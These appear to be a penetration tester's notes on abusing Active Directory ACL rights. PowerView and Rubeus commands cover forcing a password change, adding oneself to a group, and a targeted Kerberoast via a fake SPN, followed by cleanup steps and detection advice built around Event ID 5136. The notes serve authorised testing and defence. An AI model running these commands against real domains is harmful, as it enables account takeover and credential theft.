# ForceChangePassword
Authenticate as the compromised user
```JavaScript
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<user>', $SecPassword) 
```
  
Next, set the SecureString object which will be the other user’s password
```JavaScript
$userPassword = ConvertTo-SecureString '<new_pass>' -AsPlainText -Force
```
  
Next, use Set-DomainUserPassword from PowerView to change their password
```JavaScript
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity <user> -AccountPassword $userPassword -Credential $Cred -Verbose
```
  
  
# AddSelf
Authenticate as the compromised user
```JavaScript
$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<user>', $SecPassword) 
```
  
Confirm the user isn’t already in the group
```JavaScript
Get-ADGroup -Identity "<group>" -Properties * | Select -ExpandProperty Members
```
  
Add the compromised user to the group
```JavaScript
Add-DomainGroupMember -Identity '<group>' -Members '<user>' -Credential $cred -Verbose
```
  
Confirm they were added to the group
```JavaScript
Get-DomainGroupMember -Identity "<group>" | Select MemberName
```
  
## Remove Group Membership
```JavaScript
Remove-DomainGroupMember -Identity "<group>" -Members '<user>' -Credential $cred -Verbose
```
  
Confirm that the user was removed
```JavaScript
Get-DomainGroupMember -Identity "<group>" | Select MemberName |? {$_.MemberName -eq '<user>'} -Verbose
```
# GenericAll (Targeted Kerberoast)
Authenticate as the compromised user
```JavaScript
$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<user>', $SecPassword) 
```
  
Create a fake SPN for the target user
```JavaScript
Set-DomainObject -Credential $cred -Identity <target_user> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```
- if this worked, you should be able to kerberoast the user using any method
  
## Rubeus
```JavaScript
./Rubeus.exe kerberoast /user:<user> /nowrap
```
![image 364.png](../../assets/ACL%20Abuse/image%20364.png)
  
## Removing the Fake SPN
```JavaScript
Set-DomainObject -Credential $cred -Identity <user> -Clear serviceprincipalname -Verbose
```
  
# Cleanup
few things we need to do for the attack chain shown above
- remove the fake SPN created for the user
- Remove the user added to the group in AddSelf
- set the password for the user whose password changed back to original (if we know it), or have the client inform the user
  
  
# Detection
- audit for and removing dangerous ACLs
- monitor group membership
- audit and monitor for ACL changes
    
    - Event ID 5136 - A directory service object was modified
    
![image 1 272.png](../../assets/ACL%20Abuse/image%201%20272.png)
  
in the details tab for event viewer, it shows the information shown in Security Descriptor Definition Language (SDDL), which is not human readable
  
to make it readable, use ConvertFrom-SddlString cmdlet
```JavaScript
ConvertFrom-SddlString "<string>" | select -ExpandProperty DiscretionaryAcl
```
- use the attribute value from the screenshot
![image 2 231.png](../../assets/ACL%20Abuse/image%202%20231.png)